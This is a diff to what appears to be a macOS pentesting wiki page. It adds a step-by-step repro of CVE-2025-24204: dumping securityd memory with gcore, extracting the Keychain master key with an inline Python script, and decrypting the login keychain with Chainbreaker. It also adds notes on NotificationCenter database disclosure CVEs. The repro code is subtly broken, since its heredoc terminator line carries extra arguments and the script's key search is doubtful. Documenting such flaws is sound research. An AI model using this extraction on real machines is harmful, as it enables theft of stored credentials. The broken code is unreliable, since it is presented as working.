@@ -128,6 +128,26 @@ If you know the users password you can use it to **dump and decrypt keychains th
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
 
+### Keychain master key via `gcore` entitlement (CVE-2025-24204)
+
+macOS 15.0 (Sequoia) shipped `/usr/bin/gcore` with the **`com.apple.system-task-ports.read`** entitlement, so any local admin (or malicious signed app) could dump **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks the **Keychain master key** in clear and lets you decrypt `login.keychain-db` without the user password.
+
+**Quick repro on vulnerable builds (15.0–15.2):**
+
+```bash
+sudo pgrep securityd        # usually a single PID
+sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
+python3 - <<'PY'
+import mmap,re,sys
+with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
+    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
+    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
+        c=m.group(0)
+        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
+PY $(pgrep securityd)
+```
+Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.
+
 ### kcpassword
 
 The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).
@@ -157,6 +177,11 @@ Most of the interesting information is going to be in **blob**. So you will need
 cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
 strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
 ```
+
+#### Recent privacy issues (NotificationCenter DB)
+
+- In macOS **14.7–15.1** Apple stored banner content in the `db2/db` SQLite without proper redaction. CVEs **CVE-2024-44292/44293/40838/54504** allowed any local user to read other users' notification text just by opening the DB (no TCC prompt). Fixed in **15.2** by moving/locking the DB; on older systems the above path still leaks recent notifications and attachments.
+- The database is world-readable only on affected builds, so when hunting on legacy endpoints copy it before updating to preserve artefacts.
 
 ### Notes
 
@@ -271,6 +296,11 @@ These are notifications that the user should see in the screen:
 - **`CFUserNotification`**: These API provides a way to show in the screen a pop-up with a message.
 - **The Bulletin Board**: This shows in iOS a banner that disappears and will be stored in the Notification Center.
 - **`NSUserNotificationCenter`**: This is the iOS bulletin board in MacOS. The database with the notifications in located in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+
+## References
+
+- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
+- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
 
 {{#include ../../../banners/hacktricks-training.md}}
 
